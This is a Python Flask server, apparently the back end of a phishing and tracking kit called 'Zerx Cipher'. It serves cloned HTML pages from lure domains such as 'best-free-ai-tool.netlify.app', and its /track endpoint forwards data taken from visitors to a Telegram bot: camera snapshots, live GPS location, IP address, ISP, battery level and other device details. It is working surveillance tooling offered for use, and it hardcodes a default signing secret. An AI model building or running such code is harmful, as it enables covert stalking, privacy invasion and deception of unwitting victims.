#!/usr/bin/env python3
# server.py — Flask backend for Zerx Cipher
# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store, /track, /health
# Includes permissive CORS so the Netlify-hosted pages can call it.

from flask import Flask, request, jsonify, Response
import hmac, hashlib, time, sqlite3, os, json, base64
from datetime import datetime, timezone

app = Flask(__name__)

LINK_SECRET = os.environ.get("LINK_SECRET", "zE4o-jRvHuJiSbw-bg72aeygBJ-In52YqBj_oV-PuYoYlmrIhf_jhjzThgCmShLt")
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
DIVIDER     = "━━━━━━━━━━━━━━━━"
FOOTER      = "⚡ Developed by: @zerxofficial"

_CLONES = {}

ALLOWED_ORIGINS = {
    "https://best-free-ai-tool.netlify.app",
    "https://best-free-ai-tools.netlify.app",
    "https://subtle-sunburst-1d934f.netlify.app",
}

@app.after_request
def add_cors(resp):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS or origin.endswith(".netlify.app"):
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Max-Age"] = "86400"
    return resp

def _sign(payload: str) -> str:
    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]

def _flag_emoji(cc):
    if not cc or len(cc) != 2:
        return ""
    try:
        return chr(0x1F1E6 + ord(cc[0].upper()) - 65) + chr(0x1F1E6 + ord(cc[1].upper()) - 65)
    except Exception:
        return ""

def _send_telegram_text(chat_id, text):
    import requests as rq
    try:
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=12,
        )
    except Exception as e:
        print(f"telegram text failed: {e}")

def _send_telegram_photo(chat_id, b64_data, caption):
    import requests as rq
    try:
        if "," in b64_data:
            b64_data = b64_data.split(",", 1)[1]
        raw = base64.b64decode(b64_data)
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            files={"photo": ("capture.jpg", raw)},
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
            timeout=20,
        )
    except Exception as e:
        print(f"telegram photo failed: {e}")

@app.route("/api/verify", methods=["GET", "OPTIONS"])
def api_verify():
    if request.method == "OPTIONS":
        return ("", 204)
    uid_s = request.args.get("id", "")
    tok   = request.args.get("t", "")
    if not uid_s.isdigit() or not tok:
        return jsonify({"ok": False, "reason": "missing"}), 403
    uid = int(uid_s)
    try:
        exp_s, sig = tok.split(".", 1)
        exp = int(exp_s)
    except Exception:
        return jsonify({"ok": False, "reason": "malformed"}), 403
    if exp < int(time.time()):
        return jsonify({"ok": False, "reason": "expired"}), 403
    expected = _sign(f"{uid}.{exp}")
    if not hmac.compare_digest(expected, sig):
        return jsonify({"ok": False, "reason": "bad_signature"}), 403
    return jsonify({"ok": True, "uid": uid})

@app.route("/api/clone-store", methods=["POST"])
def clone_store():
    try:
        data = request.get_json(force=True) or {}
        slug = data.get("slug", "")
        html = data.get("html", "")
        if not slug or not html:
            return jsonify({"ok": False}), 400
        _CLONES[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS clone_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO clone_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/clone/<slug>", methods=["GET"])
def api_clone(slug):
    html = _CLONES.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return "Not found", 404

@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    payload = data.get("data", {}) or {}
    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")

    # ── CAMERA ──
    if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
        caption = (
            f"📸 <b>Camera Capture Received</b>\n"
            f"{DIVIDER}\n"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_photo(uid, payload["image"], caption)
        return jsonify({"ok": True}), 200

    # ── LOCATION ──
    if typ == "location" and isinstance(payload, dict):
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        maps = f"https://maps.google.com/?q={lat},{lon}"
        text = (
            f"📍 <b>Live Location Captured</b>\n"
            f"{DIVIDER}\n"
            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
            f"🗺 Map: {maps}\n"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_text(uid, text)
        return jsonify({"ok": True}), 200

    # ── DEVICE INFO ──
    if typ == "device_info" and isinstance(payload, dict):
        ua = payload.get("ua", "n/a")
        platform = payload.get("platform", "n/a")
        lang = payload.get("lang", "n/a")
        langs = payload.get("langs", "n/a")
        screen_res = payload.get("screen", "n/a")
        avail = payload.get("avail", "n/a")
        color_depth = payload.get("colorDepth", "n/a")
        tz = payload.get("tz", "n/a")
        cores = payload.get("cores", "n/a")
        mem = payload.get("mem", "n/a")
        touch = payload.get("touch", "n/a")
        touch_points = payload.get("touchPoints", "n/a")
        cookies = payload.get("cookies", "n/a")
        dnt = payload.get("dnt", "n/a")
        url = payload.get("url", "n/a")

        ip = payload.get("ip", "?")
        country = payload.get("country", "?")
        cc = payload.get("countryCode", "")
        region = payload.get("region", "?")
        city = payload.get("city", "?")
        isp = payload.get("isp", "?")
        asn = payload.get("asn", "?")
        bat_level = payload.get("batteryLevel", "n/a")
        bat_charge = payload.get("batteryCharging", "n/a")

        text = (
            f"📊 <b>Visitor Information Captured</b>\n"
            f"{DIVIDER}\n\n"
            f"🖥️ <b>Device &amp; Browser</b>\n"
            f"   • Device Model: {platform}\n"
            f"   • User Agent: {ua}\n\n"
            f"🌐 <b>Network Information</b>\n"
            f"   • IP Address: {ip}\n"
            f"   • Language: {lang} ({langs})\n"
            f"   • ISP: {isp}\n"
            f"   • ASN: {asn}\n\n"
            f"📍 <b>Location Details</b>\n"
            f"   • Country: {country} {_flag_emoji(cc)}\n"
            f"   • Region: {region}\n"
            f"   • City: {city}\n"
            f"   • Timezone: {tz}\n\n"
            f"🖼️ <b>Display Information</b>\n"
            f"   • Resolution: {screen_res} (avail {avail})\n"
            f"   • Color Depth: {color_depth}\n"
            f"   • Touch: {touch} ({touch_points})\n\n"
            f"🔋 <b>Battery Status</b>\n"
            f"   • Level: {bat_level}\n"
            f"   • Charging: {bat_charge}\n\n"
            f"💾 <b>Hardware &amp; Storage</b>\n"
            f"   • CPU Cores: {cores}\n"
            f"   • RAM: {mem} GB\n\n"
            f"⚙️ <b>Other</b>\n"
            f"   • Cookies: {cookies}\n"
            f"   • DNT: {dnt}\n"
            f"   • Page URL: {url}\n\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        return jsonify({"ok": True}), 200

    # ── FALLBACK ──
    text = (
        f"📡 <b>{typ}</b>\n"
        f"{DIVIDER}\n"
        f"<code>{json.dumps(payload)[:900]}</code>\n"
        f"{DIVIDER}\n"
        f"{FOOTER}"
    )
    _send_telegram_text(uid, text)
    return jsonify({"ok": True}), 200

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": datetime.now(timezone.utc).isoformat()})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
